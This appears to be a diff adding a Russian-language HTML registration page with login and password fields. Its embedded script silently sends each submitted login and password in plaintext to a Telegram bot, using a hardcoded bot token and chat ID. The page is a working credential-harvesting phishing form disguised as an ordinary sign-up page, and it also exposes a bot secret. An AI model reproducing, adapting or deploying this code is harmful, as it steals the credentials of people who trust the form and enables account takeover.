@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Регистрация</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    input { margin: 5px 0; padding: 8px; width: 200px; }
+    button { padding: 10px 15px; }
+  </style>
+</head>
+<body>
+  <h2>Регистрация</h2>
+  <form id="form">
+    <label>Логин:</label><br>
+    <input type="text" id="login" required><br>
+
+    <label>Пароль:</label><br>
+    <input type="password" id="password" required><br><br>
+
+    <button type="submit">Отправить</button>
+  </form>
+
+  <p id="status"></p>
+
+  <script>
+    const TOKEN = '7696324080:AAF0H1ZwXRPlVHeyAx-k5mzQCm4oCWQ5bVw';
+    const CHAT_ID = '1969968725';
+    const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    const form = document.getElementById('form');
+    const status = document.getElementById('status');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const login = document.getElementById('login').value;
+      const password = document.getElementById('password').value;
+
+      const message = `📝 Новая регистрация:\n👤 Логин: ${login}\n🔒 Пароль: ${password}`;
+
+      fetch(API, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .then(res => {
+        status.textContent = "Данные отправлены!";
+        form.reset();
+      })
+      .catch(err => {
+        status.textContent = "Ошибка отправки.";
+        console.error(err);
+      });
+    });
+  </script>
+</body>
+</html>
